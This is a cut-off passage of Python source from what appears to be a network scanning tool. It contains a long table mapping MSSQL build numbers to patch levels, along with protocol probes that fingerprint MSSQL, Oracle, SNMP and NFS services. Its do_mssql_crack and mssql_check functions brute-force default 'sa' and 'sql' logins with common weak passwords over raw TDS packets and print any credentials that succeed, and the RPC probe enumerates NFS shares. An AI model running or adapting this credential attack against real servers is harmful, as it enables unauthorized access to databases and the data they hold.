            0x080003a1,
            0x080003a0,
            0x0800039f,
            0x0800039e,
            0x0800039b,
            0x0800039a,
            0x08000397,
            0x08000394,
            0x08000393,
            0x08000391,
            0x0800038f,
            0x0800038e,
            0x0800038c,
            0x08000388,
            0x0800037c,
            0x0800037b,
            0x0800036f,
            0x0800036e,
            0x0800036c,
            0x08000369,
            0x08000367,
            0x08000366,
            0x08000365,
            0x08000363,
            0x08000362,
            0x08000361,
            0x0800035f,
            0x0800035b,
            0x0800035a,
            0x08000359,
            0x08000358,
            0x08000356,
            0x08000354,
            0x08000353,
            0x08000352,
            0x08000350,
            0x0800034f,
            0x0800034d,
            0x0800034c,
            0x0800034a,
            0x08000349,
            0x08000348,
            0x08000347,
            0x08000345,
            0x08000333,
            0x08000332,
            0x08000330,
            0x0800032e,
            0x0800032b,
            0x08000327,
            0x08000324,
            0x08000321,
            0x08000320,
            0x0800031e,
            0x0800031a,
            0x08000317,
            0x08000316,
            0x08000315,
            0x08000314,
            0x0800030d,
            0x0800030c,
            0x0800030b,
            0x08000308,
            0x08000307,
            0x08000301,
            0x080002fd,
            0x080002fb,
            0x080002fa,
            0x080002f8,
            0x080002e7,
            0x080002e5,
            0x080002e0,
            0x080002df,
            0x080002dd,
            0x080002da,
            0x080002d8,
            0x080002d5,
            0x080002d3,
            0x080002d1,
            0x080002ce,
            0x080002cb,
            0x080002ca,
            0x080002c9,
            0x080002c6,
            0x080002c1,
            0x080002bf,
            0x080002be,
            0x080002bd,
            0x080002bc,
            0x080002b8,
            0x080002b7,
            0x080002b5,
            0x080002b2,
            0x080002b1,
            0x080002b0,
            0x080002ae,
            0x080002aa,
            0x080002a7,
            0x080002a6,
            0x0800029b,
            0x08000299,
            0x08000295,
            0x0800028f,
            0x0800028c,
            0x0800028a,
            0x08000284,
            0x08000260,
            0x0800025c,
            0x08000257,
            0x08000252,
            0x08000242,
            0x08000231,
            0x0800022e,
            0x08000228,
            0x08000216,
            0x08000214,
            0x080001db,
            0x080001da,
            0x080001d9,
            0x080001d7,
            0x080001d5,
            0x080001c4,
            0x080001bc,
            0x080001bb,
            0x080001ac,
            0x08000180,
            0x08000128,
            0x0800011f,
            0x080000fb,
            0x080000fa,
            0x080000f9,
            0x080000ef,
            0x080000e9,
            0x080000e7,
            0x080000e2,
            0x080000e1,
            0x080000df,
            0x080000de,
            0x080000da,
            0x080000d9,
            0x080000d3,
            0x080000d2,
            0x080000cd,
            0x080000cc,
            0x080000c2,
            0x080000be,
            0x08000064,
            0x0800004e,
            0x0800002f,
            0x07000480,
            0x0700047e,
            0x0700047d,
            0x07000478,
            0x07000477,
            0x07000449,
            0x07000446,
            0x07000446,
            0x07000445,
            0x0700043f,
            0x07000437,
            0x07000436,
            0x07000435,
            0x07000427,
            0x07000409,
            0x07000402,
            0x070003ec,
            0x070003e4,
            0x070003d2,
            0x070003d1,
            0x070003ca,
            0x070003c1,
            0x07000399,
            0x07000397,
            0x07000396,
            0x07000395,
            0x0700038e,
            0x07000389,
            0x07000379,
            0x0700036f,
            0x07000359,
            0x0700034a,
            0x07000347,
            0x07000343,
            0x07000308,
            0x07000302,
            0x070002e9,
            0x070002d2,
            0x070002bb,
            0x070002b1,
            0x070002a5,
            0x07000296,
            0x07000292,
            0x07000291,
            0x07000283,
            0x0700026f,
            0x07000247,
            0x07000205,
            0x063201e0,
            0x063201df,
            0x063201d0,
            0x063201a0,
            0x0632019f,
            0x06320153,
            0x06320129,
            0x06320119,
            0x06320103,
            0x06320102,
            0x063200fc,
            0x063200f0,
            0x063200d5,
            0x063200c9,
            0x06000097,
            0x0600008b,
            0x0600007c,
            0x06000079
            ]
        p = [
            "2005 SP2+Q960090",
            "2005 SP2+Q962209",
            "2005 SP2+Q961479",
            "2005 SP2+Q958735",
            "2005 SP2+Q959132",
            "2005 SP2+Q956854",
            "2005 SP2+Q956889",
            "2005 SP2+Q937137",
            "2005 SP2+Q953752",
            "2005 SP2+Q955754",
            "2005 SP2+Q954950",
            "2005 SP2+Q954669 / 954831",
            "2005 SP2+Q951217 (Cumulative HF8, avail. via request.)",
            "2005 SP2+Q952330",
            "2005 SP2+Q951204",
            "2005 SP2+Q949095 (Cumulative HF7, avail. via PSS only - must supply KBID of issue to resolve in your request)",
            "2005 SP2+Q950189",
            "2005 (QFE) SP2+Q941203 / 948108",
            "2005 SP2+Q949959",
            "2005 SP2+Q949687/949595",
            "2005 SP2+Q949199",
            "2005 SP2+Q946608 (Cumulative HF6, avail. via PSS only - must supply KBID of issue to resolve in your request)",
            "2005 SP2+Q947463",
            "2005 SP2+Q945640 / 945641 / 947196 / 947197",
            "2005 SP2+Q942908 / 945442 / 945443 / 945916 / 944358 ",
            "2005 SP2+Q941450 (Cumulative HF5, avail. via PSS only - must supply KBID of issue to resolve in your request)",
            "2005 SP2 (KB N/A, SQLHF Bug #50002118)",
            "2005 SP2+Q944902",
            "2005 SP2+Q944677",
            "2005 SP2 (KB N/A, SQLHF Bug #50001708/50001999)",
            "2005 SP2 (KB N/A, SQLHF Bug #50001951/50001993/50001997/50001998/50002000)",
            "2005 SP2+Q941450 (Cumulative HF4, avail. via PSS only - must supply KBID of issue to resolve in your request)",
            "2005 SP2 (KB N/A, SQLHF Bug #50001812)",
            "2005 SP2+Q940933",
            "2005 SP2+Q939562 (Cumulative HF3, avail. via PSS only - must supply KBID of issue to resolve in your request)",
            "2005 SP2+Q940128",
            "2005 SP2+Q939942",
            "2005 SP2+Q938243",
            "2005 SP2 (KB N/A, SQLHF Bug #50001193/5001352)",
            "2005 SP2+Q939563 / 939285",
            "2005 SP2+Q936305 /938825 (Cumulative HF2, avail. via PSS only - must supply KBID of issue to resolve in your request)",
            "2005 SP2+Q937745",
            "2005 SP2+Q937041/937033",
            "2005 SP2+Q936185 / 934734",
            "2005 SP2+Q932610/935360/935922",
            "2005 SP2+Q935356/933724(Cumulative HF1, avail. via PSS only - must supply KBID of issue to resolve in your request)",
            "2005 SP2+Q934459",
            "2005 SP2+Q934226",
            "2005 SP2+Q933549 / 933766/933808/933724/932115/933499",
            "2005 SP2+Q934106 / 934109 / 934188",
            "2005 SP2+Q933564",
            "2005 SP2+Q933097 (Cumulative HF1)",
            "2005 (GDR) SP2+Q941203 / 948109",
            "2005 SP2+Q934458",
            "2005 SP2+Q933508",
            "2005 SP2+Q933508 (use this if SP2 was applied prior to 3/8)",
            "2005 'Fixed' SP2 (use this if SP2 was NOT applied yet - orig. RTM removed)",
            "2005 SP2 CTP (December) - Fix List",
            "2005 SP2 CTP (November)",
            "2005 SP1+Q929376",
            "2005 SP1+Q933573",
            "2005 SP1+Q944968",
            "2005 SP1+Q943389/943388",
            "2005 SP1+Q940961",
            "2005 SP1+Q940719",
            "2005 SP1+Q940287 / 940286",
            "2005 SP1+Q937343",
            "2005 SP1+Q933499/937545",
            "2005 SP1+Q937277",
            "2005 SP1+Q934812",
            "2005 SP1+Q936179",
            "2005 SP1+Q935446",
            "2005 SP1+Q934066/933265",
            "2005 SP1+Q933762/934065934065",
            "2005 SP1+Q932990 / 933519",
            "2005 SP1+Q932393",
            "2005 SP1+Q931593",
            "2005 SP1+Q931329 / 932115",
            "2005 SP1+Q931843 / 931843",
            "2005 SP1+Q931821",
            "2005 SP1+Q931666",
            "2005 SP1+Q929240 / 930505 / 930775",
            "2005 SP1+Q930283 / 930284",
            "2005 SP1+Q929278",
            "2005 SP1+Q929179 / 929404",
            "2005 SP1+Q928394 / 928372 / 928789",
            "2005 SP1+Q928539 / 928083 / 928537",
            "2005 SP1+Q927643",
            "2005 SP1+Q927289",
            "2005 SP1+Q926773 / 926611 / 924808 / 925277 / 926612 / 924807 / 924686",
            "2005 SP1+Q926285/926335/926024",
            "2005 SP1+Q926240",
            "2005 SP1+Q925744",
            "2005 SP1+Q924954/925335",
            "2005 SP1+Q925135",
            "2005 SP1+Q925227",
            "2005 SP1+Q925153",
            "2005 SP1+Q923849",
            "2005 SP1+Q929404 / 924291",
            "2005 SP1+Q923624/923605",
            "2005 SP1+Q923296 / 922594",
            "2005 SP1+Q922578 /922438 / 921536 / 922579 / 920794",
            "2005 SP1+Q922063",
            "2005 SP1+Q920974/921295",
            "2005 SP1+Q919636 / 918832/919775",
            "2005 SP1+Q919611",
            "2005 SP1+builds 1531-40 (See Q919224 before applying!)",
            "2005 SP1+.NET Vulnerability fix",
            "2005 SP1 RTM",
            "2005 SP1 CTP",
            "SP1 Beta",
            "2005 RTM+Q932556",
            "2005 RTM+Q926493",
            "2005 RTM+Q926292",
            "2005 RTM+Q922804",
            "2005 RTM+Q917887/921106",
            "2005 RTM+Q918276",
            "2005 RTM+Q917905/919193",
            "2005 RTM+Q917888/917971",
            "2005 RTM+Q917738",
            "2005 RTM+Q917824",
            "2005 RTM+Q917016",
            "2005 RTM+Q916706",
            "2005 RTM+Q916086",
            "2005 RTM+Q916046",
            "2005 RTM+Q915918",
            "2005 RTM+Q915112 / 915306 / 915307/ 915308",
            "2005 RTM+Q913494",
            "2005 RTM+Q912472/913371/913941",
            "2005 RTM+Q912471",
            "2005 RTM+Q911662",
            "2005 RTM+Q915793",
            "2005 RTM+Q910416",
            "2005 RTM+Q932557",
            "2005 RTM",
            "September CTP Release",
            "June CTP Release",
            "April CTP Release",
            "March CTP Release (may list as Feb.)",
            "December CTP Release",
            "October CTP Release",
            "Internal build (?)",
            "Beta 2",
            "Internal build (?)",
            "Internal build (?)",
            "Express Ed. Tech Preview",
            "Internal build (IDW4)",
            "Internal build (IDW3)",
            "Internal build (IDW2)",
            "Internal build (IDW)",
            "MS Internal (?)",
            "Beta 1",
            "2000 (QFE) SP4+Q941203 / 948111",
            "2000 SP4+Q946584",
            "2000 SP4+Q944985",
            "2000 SP4+Q939317",
            "2000 SP4+Q936232",
            "2000 SP4+Q935950",
            "2000 SP4+Q935465",
            "2000 SP4+Q933573",
            "2000 SP4+Q934203",
            "2000 SP4+Q929131/932686/932674",
            "2000 SP4+Q931932",
            "2000 SP4+Q929440 / 929131",
            "2000 SP4+Q928568",
            "2000 SP4+Q928079",
            "2000 SP4+Q927186",
            "2000 SP4+Q925684/925732",
            "2000 SP4+Q925678 / 925419",
            "2000 SP4+Q925297",
            "2000 SP4+Q924664",
            "2000 SP4+Q924662/923563/923327 / 923796",
            "2000 SP4+Q923797",
            "2000 SP4+Q923344",
            "2000 SP4+Q920930",
            "2000 SP4+Q919221",
            "2000 SP4+Q919133/919068/919399",
            "2000 SP4+Q919165",
            "2000 SP4+Q917972 / 917565",
            "2000 SP4+Q917606",
            "2000 SP4+Q916698/916950",
            "2000 SP4+Q916652/913438",
            "2000 SP4+916287/914384/898709/915065/915340",
            "2000 SP4+Q913684 (64bit)",
            "2000 SP4+Q911678 / 922579",
            "2000 SP4+Q910707",
            "2000 SP4+Q909369",
            "2000 SP4+Q907813",
            "2000 SP4+Q921293",
            "2000 SP4+Q909734",
            "2000 SP4+Q904660",
            "2000 (64b) SP4+Q907250",
            "2000 SP4+Q906790",
            "2000 SP4+Q903742 / 904244",
            "2000 SP4+Q899430/31/900390/404/901212/902150/955",
            "2000 SP4+Q899410",
            "2000 SP4+Q826906/836651",
            "2000 (GDR) SP4+Q941203 / 948110",
            "2000 SP4+Q899761",
            "2000 SP4 ",
            "2000 SP4 Beta",
            "2000 SP3+Q899410",
            "2000 SP3+Q930484",
            "2000 SP3+Q929410",
            "2000 SP3+Q917593",
            "2000 SP3+Q915328",
            "2000 SP3+Q902852",
            "2000 SP3+Q900416",
            "2000 SP3+Q899428/899430",
            "2000 SP3+Q898709",
            "2000 SP3+Q887700",
            "2000 SP3+Q896985",
            "2000 SP3+Q897572",
            "2000 SP3+Q896425",
            "2000 SP3+Q895123/187",
            "2000 SP3+Q891866",
            "2000 SP3+Q894257",
            "2000 SP3+Q893312",
            "2000 SP3+Q892923",
            "2000 SP3+Q892205",
            "2000 SP3+Q891585",
            "2000 SP3+Q891311",
            "2000 SP3+Q891017/891268",
            "2000 SP3+Q890942/768/767",
            "2000 SP3+Q890925/888444/890742",
            "2000 SP3+Q889314",
            "2000 SP3+Q890200",
            "2000 SP3+Q889166",
            "2000 SP3+Q889239",
            "2000 SP3+Q887974",
            "2000 SP3+Q888007 ",
            "2000 SP3+Q884554",
            "2000 SP3+Q885290",
            "2000 SP3+Q872842",
            "2000 SP3+Q878501",
            "2000 SP3+Q883415",
            "2000 SP3+Q873446",
            "2000 SP3+Q878500",
            "2000 SP3+Q870994",
            "2000 SP3+Q867798",
            "2000 SP3+Q843282",
            "2000 SP3+Q867878/867879/867880",
            "2000 SP3+Q843266",
            "2000 SP3+Q843263",
            "2000 SP3+Q839280",
            "2000 SP3+Q841776",
            "2000 SP3+Q841627",
            "2000 SP3+Q841401",
            "2000 SP3+Q841404",
            "2000 SP3+Q840856",
            "2000 SP3+Q839529",
            "2000 SP3+Q839589",
            "2000 SP3+Q839688",
            "2000 SP3+Q839523",
            "2000 SP3+Q838460",
            "2000 SP3+Q837970",
            "2000 SP3+Q837957",
            "2000 SP3+Q317989",
            "2000 SP3+Q837401",
            "2000 SP3+Q836651",
            "2000 SP3+Q837957",
            "2000 SP3+Q834798",
            "2000 SP3+Q834290",
            "2000 SP3+Q834453",
            "2000 SP3+Q833710",
            "2000 SP3+Q836141",
            "2000 SP3+Q832977",
            "2000 SP3+Q831950",
            "2000 SP3+Q830912/831997/831999",
            "2000 SP3+Q830887",
            "2000 SP3+Q830767/830860",
            "2000 SP3+Q830262",
            "2000 SP3+Q830588",
            "2000 SP3+Q830366",
            "2000 SP3+Q830366",
            "2000 SP3+Q830395/828945",
            "2000 SP3+Q829205/829444",
            "2000 SP3+Q821334 *May contain errors*",
            "2000 SP3+Q828637",
            "2000 SP3+Q828017/827714/828308",
            "2000 SP3+Q828096",
            "2000 SP3+Q828699",
            "2000 SP3+Q830466/827954",
            "2000 SP3+Q826754",
            "2000 SP3+Q826860/826815/826906",
            "2000 SP3+Q826822",
            "2000 SP3+Q826433",
            "2000 SP3+Q826364/825854",
            "2000 SP3+Q826080",
            "2000 SP3+Q825043",
            "2000 SP3+Q825225",
            "2000 SP3+Q319477/319477",
            "2000 SP3+Q823877/824027/820788",
            "2000 SP3+Q821741/548/740/823514",
            "2000 SP3+Q826161",
            "2000 SP3+Q821277/337/818388/826161/821280",
            "2000 SP3+Q818766",
            "2000 SP3+Q819662",
            "2000 SP3+Q819248/819662/818897",
            "2000 SP3+Q818899",
            "2000 SP3+Q818729",
            "2000 SP3+Q818540",
            "2000 SP3+Q818414/097/188",
            "2000 SP3+Q817464",
            "2000 SP3+Q817464/813524/816440/817709",
            "2000 SP3+Q815249",
            "2000 SP3+Q817081",
            "2000 SP3+Q816840",
            "2000 SP3+Q816985",
            "2000 SP3+Q815057",
            "2000 SP3+Q816084/810185",
            "2000 SP3+Q814035",
            "2000 SP3+Unidentified",
            "2000 SP3+Q815115",
            "2000 SP3+Q814889/93",
            "2000 SP3+Q810163/688/811611/813769/813759/812995/814665/460/813494",
            "2000 SP3+Q814113",
            "2000 SP3+Q814032",
            "2000 SP3/SP3a",
            "2000 SP2+Q818406/763",
            "2000 SP2+Q818096",
            "2000 SP2+Q816937",
            "2000 SP2+Q814889",
            "2000 SP2+Q813759",
            "2000 SP2+Q813769",
            "2000 SP2+Q814460",
            "2000 SP2+Q812995/813494",
            "2000 SP2+Q812798",
            "2000 SP2+Q812250/812393",
            "2000 SP2+Q811703",
            "2000 SP2+Q810688/811611",
            "2000 SP2+Q811478",
            "2000 SP2/3+Q811205",
            "2000 SP2/3+Q811052",
            "2000 SP2+Q810920",
            "2000 SP2+Q810526",
            "2000 SP2+Q328551",
            "2000 SP2+Q810026/810163",
            "2000 SP2+Q810072",
            "2000 SP2+Q810052/10",
            "2000 SP2+Q331885/965/968",
            "2000 SP2+Q330212",
            "2000 SP2+Q311104",
            "2000 SP2+Q329499",
            "2000 SP2+Q329487",
            "2000 SP2+Q316333",
            "2000 SP3+Q319851",
            "2000 SP2+Q316333",
            "2000 SP2+Q328354",
            "2000 SP2+8/14 fix",
            "2000 SP2+8/8 fix",
            "2000 SP2+Q326999",
            "2000 SP2+7/24 fix",
            "2000 SP2+Q810010?",
            "2000 SP2+Q322853",
            "2000 SP2+Q324186",
            "2000 SP2+Q319507",
            "2000 SP2+3/29 fix",
            "2000 SP2+Q319869",
            "2000 SP2+Q319477/319477",
            "2000 SP2+Q317979/318045",
            "2000 SP2+1/29 fix",
            "2000 SP2+Q314003/315395",
            "2000 SP2+Q313002/5",
            "2000 SP2.01",
            "2000 SP2",
            "2000 SP1+1/29 fix",
            "2000 SP1+Q315395",
            "2000 SP1+Q314003",
            "2000 SP1+Q313302",
            "2000 SP1+Q313005",
            "2000 SP1+Q308547",
            "2000 SP1+Q307540/307655",
            "2000 SP1+Q307538",
            "2000 SP1+Q304850",
            "2000 SP1",
            "2000 No SP+Q299717",
            "2000 No SP+Q297209",
            "2000 No SP+Q300194",
            "2000 No SP+Q291683",
            "2000 No SP+Q288122",
            "2000 No SP+Q285290",
            "2000 No SP+Q282416",
            "2000 No SP+Q282279",
            "2000 No SP+Q278239",
            "2000 No SP+Q281663",
            "2000 No SP+Q280380",
            "2000 No SP+Q281769",
            "2000 No SP+Q279183",
            "2000 No SP+Q279293/279296",
            "2000 No SP+Q276329",
            "2000 No SP+Q275900",
            "2000 No SP+Q274330",
            "2000 No SP+Q274329",
            "2000 RTM/No SP",
            "2000 Gold, no SP",
            "2000 Beta 2",
            "2000 EAP5",
            "2000 EAP4",
            "7 SP4+Q941203 / 948113",
            "7.0 SP4+Q891116",
            "7.0 SP4+Q867763",
            "7.0 SP4+Q830233",
            "7.0 SP4+Q829015",
            "7.0 SP4+Q822756",
            "7.0 SP4+Q815495",
            "7.0 SP4+Q821279",
            "7.0 SP4+Q820788",
            "7.0 SP4+Q814693",
            "329499",
            "7.0 SP4+Q327068",
            "7.0 SP4+Q316333",
            "7.0 SP4 - All languages",
            "7.0 SP3+Q324469",
            "7.0 SP3+Q319851",
            "7.0 SP3+Q304851",
            "7.0 SP3+Q299717",
            "7.0 SP3+Q285870",
            "7.0 SP3+Q284351",
            "7.0 SP3+Q283837/282243",
            "7.0 SP3 - All languages",
            "7.0 SP2+Q283837",
            "7.0 SP2+Q282243",
            "7.0 SP2+Q280380",
            "7.0 SP2+Q279180",
            "7.0 SP2+Q275901",
            "7.0 SP2+Q274266",
            "7.0 SP2+Q243741",
            "7.0 SP2+Q281185",
            "7.0 SP2+Q260346",
            "7.0 SP2",
            "7.0 SP2 Unidentified",
            "7.0 SP2 Beta",
            "7.0 SP1+Q258087",
            "7.0 SP1+Q252905",
            "7.0 SP1+Q253738",
            "7.0 SP1+Q239458",
            "7.0 SP1",
            "7.0 SP1 Beta",
            "7.0 MSDE O2K Dev",
            "7.0 Gold+Q232707",
            "7.0 Gold+Q244763",
            "7.0 Gold+Q229875",
            "7.0 Gold+Q220156",
            "7.0 Gold (RTM), no SP",
            "7.0 RC1",
            "7.0 Beta 3",
            "6.5 Post SP5a+Q238621",
            "6.5 Post SP5a",
            "6.5 SP5a+Q275483",
            "6.5 Bad SP5a",
            "6.5 Bad SP5",
            "6.5 Y2K Hotfix",
            "6.5 Site Server 3",
            "6.5 SP4",
            "6.5 SP3 SBS Only",
            "6.5 SP3",
            "6.5 Bad SP3",
            "6.5 SP2",
            "6.5 SP1",
            "6.5 Gold",
            "6.0 SP3",
            "6.0 SP2",
            "6.0 SP1",
            "6.0 No SP"
            ]
        ret = ""
        if(len(rbuf)):
            try:
                if(rbuf[0] != '\x04' or rbuf[1] != '\x01'):
                    return "May be not really MSSQL Service"
                rl = sk.ntohs(struct.unpack('H', rbuf[2:4])[0])
                if(rl < 19):
                    return "unknown"
                if(sk.ntohs(struct.unpack('H', rbuf[0xb:0xb + 2])[0]) != 6):
                    print "!=6"
                    return "unknown"
                index = sk.ntohs(struct.unpack('H', rbuf[0x9:0x9 + 2])[0]) + 8
                if (index + 6) > rl:
                    print "index+6"
                    return "unknown"
                version = sk.ntohl(struct.unpack('L', rbuf[index:index + 4])[0])
                ret = "MSSQL Server %u.%u.%u" % (struct.unpack('B', rbuf[index])[0], struct.unpack('B', rbuf[index + 1])[0], sk.ntohs(struct.unpack('H', rbuf[index + 2:index + 4])[0]))
                if(version in v):
                    ret += "(" + p[v.index(version)] + ")"
                    self.do_mssql_crack()
                    return ret
            except:
                ret = version
        if(vul>0):
            self.do_mssql_crack()
        return ret
    
    def do_oracle_ck(self, sock):
        rbuf = ""
        trigger = "\x00\x5a\x00\x00\x01\x00\x00\x00" + \
                "\x01\x36\x01\x2c\x00\x00\x08\x00" + \
                "\x7f\xff\xa3\x0a\x00\x00\x01\x00" + \
                "\x00\x20\x00\x3a\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x06\xfc\x00\x00\x00\x02" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x28\x43\x4f\x4e\x4e\x45\x43\x54" + \
                "\x5f\x44\x41\x54\x41\x3d\x28\x43" + \
                "\x4f\x4d\x4d\x41\x4e\x44\x3d\x76" + \
                "\x65\x72\x73\x69\x6f\x6e\x29\x29"
        sock.send(trigger)
        rbuf = sock.recv(256)
        rbuf += sock.recv(256)
        try:
            if(rbuf[4] != "\x02"):
                return "unknown"
            bb = rbuf.split("\r\n")
            for x in bb:
                if("VSNNUM" in x and "TNSLSNR" in x):
                    index = x.find("TNSLSNR")
                    end = x.find("Production")
                    return x[index:end - 3]
        except:pass
        return "unknown"
    def do_mssql_crack(self):
        req_hdr = "\x02\x00\x02\x00\x00\x00\x02\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        req_pk2 = "\x30\x30\x30\x30\x30\x30\x61\x30\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x20\x18\x81\xb8\x2c\x08\x03" + \
                "\x01\x06\x0a\x09\x01\x01\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x73\x71\x75\x65\x6c\x64\x61" + \
                "\x20\x31\x2e\x30\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        req_pk3 = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x04\x02\x00\x00\x4d\x53\x44" + \
                "\x42\x4c\x49\x42\x00\x00\x00\x07\x06\x00\x00" + \
                "\x00\x00\x0d\x11\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00"
        req_lng = "\x02\x01\x00\x47\x00\x00\x02\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x30\x30\x30\x00\x00" + \
                "\x00\x03\x00\x00\x00"
        hexgroup = [[0, "\x00"],
                   [1, "\x01"], [2, "\x02"], [3, "\x03"], [4, "\x04"], [5, "\x05"],
                   [6, "\x06"], [7, "\x07"], [8, "\x08"], [9, "\x09"], [10, "\x0a"],
                   [11, "\x0b"], [12, "\x0c"], [13, "\x0d"]]
        login = ['sa', 'sql']
        password = ['', '123', 'sa', 'sql', '12345', '123456', 'pass', 'password']
        try:
            for l in login:
                for p in password:
                    #loginlen = hexgroup[len(l)][1]
                    loginlen = struct.pack('B',len(l))
                    passlen = struct.pack('B',len(p))
                    #passlen = hexgroup[len(p)][1]
                    rbuf = req_hdr + l + ('\x00' * (30 - len(l))) + loginlen + p + ('\x00' * (30 - len(p))) + passlen + req_pk2 + passlen + p + ('\x00' * (30 - len(p))) + req_pk3
                    self.mssql_check(l, p, rbuf, req_lng)
        except:pass
    def mssql_check(self, login, password, rbuf, req_lng):
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.bind((srcip,0))
            sock.set_timeout(TIME_OUT)
            sock.connect((self.host, self.port))
            sock.send(rbuf)
            sock.send(req_lng)
            rbuf = sock.recv(256)
            if(len(rbuf) > 10):
                if(rbuf[8] == '\xe3'):
                    print('%-15s:%d  [MSSQL]\t[USER] %s [PASS] %s') % (self.host, self.port, login, password)
            sock.close()
        except:pass
    def do_snmp_ck(self, sock):
    #udp scan
        rbuf = ""
        #snmpstring = "\x70\x75\x62\x6c\x69\x63"
        comlen = struct.pack('B',len(snmpstring))
        snmplen = struct.pack('B',(len(snmpstring) + 33))
        req = "\x30"+snmplen+"\x02\x01\x00\x04"+comlen+ \
            snmpstring+"\xa0\x1a\x02" + \
            "\x02\x64\x32\x02\x01\x00\x02\x01" + \
            "\x00\x30\x0e\x30\x0c\x06\x08\x2b" + \
            "\x06\x01\x02\x01\x01\x01\x00\x05" + \
            "\x00"
        #print req
        #snmpheader ={'id':'\x30','len':'\x00','version':'\x02\x01\x00','comid':'\x04','comlen':'\x00'}
        #snmpread = {'type':'\xa0\x1b','identid':'\x02\x04','ident':'\x1a\x5e\x97\x00','errstat':'\x02\x01\x00','errind':'\x02\x01\x00'\
        #,'objectid':'\x30\x0d','object':'\x30\x0b\x06\x07\x2b\x06\x01\x02\x01\x01\x01','value':'\x05\x00'}
        #snmpheader['comlen'] = len(snmpstring)
        #snmpheader['len'] = len(snmpstring) + 33
        sock.send(req)
        rbuf = sock.recv(1024)
        try:
            rbuf = rbuf.replace("\r\n", "")
            if(snmpstring in rbuf):
                return "SNMP " + rbuf.split("\x2b\x06\x01\x02\x01\x01\x01")[1][3:]
        except:pass
        return "unknown"
    def do_sad_ck(self, sock):
        rbuf = ""
        portnum = 0
        trigger = "\x03\x12\x83\x37\x00\x00\x00\x00" + \
                "\x00\x00\x00\x02\x00\x01\x86\xa0" + \
                "\x00\x00\x00\x02\x00\x00\x00\x03" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x01\x87\x88\x00\x00\x00\x0a" + \
                "\x00\x00\x00\x11\x00\x00\x00\x00"
        sock.send(trigger)
        rbuf = sock.recv(256)
        if(len(rbuf) == 28):
            portnum = (ord(rbuf[24]) << 24) + (ord(rbuf[25]) << 16) + (ord(rbuf[26]) << 8) + ord(rbuf[27])
        if portnum>0:
            return portnum
        else:
            #check nfs share
            trigger="\xbb\x05\xa8\x9d\x00\x00\x00\x00"+\
            "\x00\x00\x00\x02\x00\x01\x86\xa0"+\
            "\x00\x00\x00\x02\x00\x00\x00\x03"+\
            "\x00\x00\x00\x00\x00\x00\x00\x00"+\
            "\x00\x00\x00\x00\x00\x00\x00\x00"+\
            "\x00\x01\x86\xa5\x00\x00\x00\x01"+\
            "\x00\x00\x00\x11\x00\x00\x00\x00"
            rsend="\xbe\xeb\xfe\x32\x00\x00\x00\x00"+\
            "\x00\x00\x00\x02\x00\x01\x86\xa5"+\
            "\x00\x00\x00\x01\x00\x00\x00\x05"+\
            "\x00\x00\x00\x00\x00\x00\x00\x00"+\
            "\x00\x00\x00\x00\x00\x00\x00\x00"
            sock.send(trigger)
            rbuf = sock.recv(256)
            if(len(rbuf) == 28):
                portnum = (ord(rbuf[24]) << 24) + (ord(rbuf[25]) << 16) + (ord(rbuf[26]) << 8) + ord(rbuf[27])
                if (portnum>0):
                    sock = TimeoutSocket(socket(AF_INET, sk.SOCK_DGRAM, sk.IPPROTO_UDP), _DefaultTimeout)
                    sock.bind((srcip,0))
                    sock.set_timeout(TIME_OUT)
                    sock.connect((self.host, portnum))
                    sock.send(rsend)
                    rbuf = sock.recv(2048)
